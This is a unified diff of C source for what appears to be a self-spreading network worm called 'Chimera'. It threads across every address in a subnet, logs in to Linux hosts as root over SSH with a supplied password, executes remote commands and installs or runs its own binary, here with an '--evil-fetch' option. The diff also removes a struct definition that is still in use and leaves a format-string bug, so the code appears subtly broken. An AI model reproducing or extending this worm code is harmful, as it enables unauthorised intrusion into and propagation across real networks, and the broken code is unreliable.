@@ -1,16 +1,30 @@
 #include "net.h"
 
-typedef struct ThreadData {
-    int index;
-    const char* subnet;
-    const char* password;
-} ThreadData;
+
+// Parse system information from a remote host
+system_info_t* parse_system_info(char* sys_data) {
+    system_info_t *system_info = malloc(sizeof(system_info_t));
+    memset(system_info, 0, sizeof(system_info_t)); // Initialize struct to 0
+    char cpu_model[256];
+    printf("%s", sys_data);
+    if (sscanf(sys_data, "{\"hostname\": \"%255[^\"]\",\"cpu\": {\"model\": \"%255[^\"]\",\"cores\": %d},\"memory\": {\"total\": %lu, \"used\": %lu, \"free\": %lu},\"disk\": {\"total\": %lu, \"used\": %lu, \"available\": %lu}}",
+               system_info->hostname, cpu_model, &system_info->cpu_cores, &system_info->total_memory, &system_info->used_memory, &system_info->free_memory,
+               &system_info->disk_total, &system_info->disk_used, &system_info->disk_available) == 9) {
+        strcpy(system_info->cpu_model, cpu_model);
+    } else {
+        strcpy(system_info->cpu_model, "Unknown");
+    }
+
+    printf("Hostname: %s, CPU Model: %s, CPU Cores: %d, Total Memory: %lu, Used Memory: %lu, Free Memory: %lu, Disk Total: %lu, Disk Used: %lu, Disk Available: %lu\n", system_info->hostname, system_info->cpu_model, system_info->cpu_cores, system_info->total_memory, system_info->used_memory, system_info->free_memory, system_info->disk_total, system_info->disk_used, system_info->disk_available);
+    return system_info;
+}
 
 void* spread_worker(void* data) {
     ThreadData* thread_data = (ThreadData*)data;
     int index = thread_data->index;
     const char* subnet = thread_data->subnet;
     const char* password = thread_data->password;
+    char* username = NULL;
 
     char host_ip[MAX_COMMAND_SIZE];
     int ret = snprintf(host_ip, sizeof(host_ip), "%s.%d", subnet, index);
@@ -20,8 +34,8 @@ void* spread_worker(void* data) {
     }
 
     enum os_type host_os = get_os_type(host_ip);
+    
     if (host_os != UNKNOWN) {
-        char* username = NULL;
         if (host_os == LINUX) {
             username = "root";
             spread_linux(host_ip, username, password);
@@ -50,7 +64,7 @@ void* spread_worker(void* data) {
 char* remote_execution(const char* host, const char* username, const char* password, const char* command, const enum os_type remote_os) {
     char command_string[MAX_COMMAND_SIZE];
     int ret;
-
+    
     if(remote_os == LINUX) {
         #ifdef _WIN32
             ret = snprintf(command_string, sizeof(command_string), "echo y | %s -ssh %s -l %s -pw %s -o ConnectTimeout=1 \"%s\"",
@@ -117,10 +131,22 @@ char* remote_execution(const char* host, const char* username, const char* passw
         return NULL;
     }
 
+    // Make sure not to read memory beyond the valid range of the output buffer
+    if (bytes_read >= MAX_COMMAND_SIZE) {
+        bytes_read = MAX_COMMAND_SIZE - 1;
+    }
     // Null-terminate the output buffer
     output_buffer[bytes_read] = '\0';
 
-    return output_buffer;
+    // Resize the output buffer to the actual size of the output
+    char* resized_output_buffer = realloc(output_buffer, bytes_read + 1);
+    if (resized_output_buffer == NULL) {
+        fprintf(stderr, "Failed to resize output buffer\n");
+        free(output_buffer);
+        return NULL;
+    }
+
+    return resized_output_buffer;
 }
 
 /**
@@ -162,6 +188,7 @@ void spread_linux(const char* host, const char* username, const char* password) 
         if (output != NULL) {
             printf("%s\n", output);
             free(output);
+            output = NULL;
         }
 
 
@@ -177,6 +204,7 @@ void spread_linux(const char* host, const char* username, const char* password) 
         if (output != NULL) {
             printf("%s\n", output);
             free(output);
+            output = NULL;
         }
         
 
@@ -191,16 +219,11 @@ void spread_linux(const char* host, const char* username, const char* password) 
 
         if (output != NULL) {
             free(output);
+            output = NULL;
         }
 
-        #if __linux__
-        // Run the command on the remote Linux machine
-            ret = snprintf(command_string, sizeof(command_string), "cd Chimera && ./chimera --establish-node %s", host);
-        #else
-            // This is nothing but the compiler
-            ret = snprintf(command_string, sizeof(command_string), "cd Chimera && ./chimera --establish-node");
+        ret = snprintf(command_string, sizeof(command_string), "cd Chimera && ./chimera --evil-fetch", host);
 
-        #endif
         if (ret >= sizeof(command_string)) {
             fprintf(stderr, "Command string too long\n");
             return;
@@ -209,15 +232,21 @@ void spread_linux(const char* host, const char* username, const char* password) 
         output = remote_execution(host, username, password, command_string, LINUX);
 
         if (output != NULL) {
-            printf("%s\n", output);
+            printf(output);
+            system_info_t* p_system_info = parse_system_info(output);
+            free(p_system_info);
             free(output);
+            output = NULL;
         }
+    } else if (output == NULL) {
+        fprintf(stderr, "Failed to check Chimera directory on remote host.\n");
     } else {
         printf("Chimera directory already exists on the remote host.\n");
     }
 
     if (output != NULL) {
         free(output);
+        output = NULL;
     }
 }
 
@@ -239,9 +268,9 @@ void spread_cisco(const char* host, const char* username, const char* password) 
  */
 
 void spread(const char* subnet, const char* password) {
-    pthread_t threads[255];
+    pthread_t threads[254];
 
-    for (int i = 1; i < 255; i++) {
+    for (int i = 0; i < 254; i++) {
         ThreadData* data = (ThreadData*)malloc(sizeof(ThreadData));
         data->index = i;
         data->subnet = subnet;
@@ -249,7 +278,7 @@ void spread(const char* subnet, const char* password) {
         pthread_create(&threads[i], NULL, spread_worker, data);
     }
 
-    for (int i = 1; i < 255; i++) {
+    for (int i = 0; i < 254; i++) {
         pthread_join(threads[i], NULL);
     }
 }
